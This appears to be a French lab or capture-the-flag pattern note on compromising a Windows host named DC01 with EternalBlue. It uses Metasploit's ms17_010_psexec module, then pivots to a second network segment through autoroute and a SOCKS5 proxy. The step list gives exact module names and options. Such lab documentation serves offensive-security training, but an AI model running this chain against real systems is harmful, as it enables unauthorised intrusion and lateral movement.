---
doc_kind: pattern
title: "DANTE DC01 - EternalBlue (ms17_010_psexec) et pivot Metasploit"
category: pwn
slug: dc01-eternalblue-psexec-pivot
created: 2026-10-29
status: active
tags:
  - eternalblue
  - ms17-010
  - metasploit-pivot
  - autoroute
  - socks-proxy
chain_summary: "DC01 exploitable par MS17-010 mais uniquement via le module psexec (eternalblue direct echoue, offsets shellcode incompatibles); la session sert ensuite a router vers un second segment reseau."
---
# DANTE DC01 - EternalBlue (ms17_010_psexec) et pivot Metasploit

## Chain Summary

- One-line chain: DC01 exploitable par MS17-010 mais uniquement via le module psexec (eternalblue direct echoue, offsets shellcode incompatibles); la session sert ensuite a router vers un second segment reseau.

## Preconditions

- Voir le writeup associe pour le contexte precis de la cible.

## Cheap Probes

- Rechercher les signaux initiaux decrits dans la chaine d'exploit ci-dessous.

## Telltale Evidence

- Log "Overwrite complete... SYSTEM session obtained!"; session Meterpreter ouverte.

## Escalation Order

1. use exploit/windows/smb/ms17_010_psexec (pas ms17_010_eternalblue qui echoue).
2. Configurer RHOSTS/Proxies/payload/LHOST/LPORT/ReverseAllowProxy -> run.
3. SYSTEM session obtenue -> flags (attention aux slashes, pas de backslash).
4. use post/multi/manage/autoroute, autoadd puis print (pas 'run autoroute' deprecie).
5. use auxiliary/server/socks_proxy, VERSION 5 obligatoire -> run -j -> acces au second segment.

## Common Mistakes

- Ne pas verifier ce signal/cette condition avant de passer a une autre piste (voir lecon ci-dessous).

## Payload Shapes

```text
Sur cible EternalBlue sensible aux offsets, toujours tester psexec avant eternalblue direct; port 445 peut devenir instable apres plusieurs essais; pivot Meterpreter via autoroute+socks_proxy (VERSION 5 uniquement).
```

## Related Writeups

- dc01-eternalblue-psexec-pivot

## Skill Impact

- Related skill: a classer lors d'une prochaine passe skill-maintainer si le pattern se repete.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
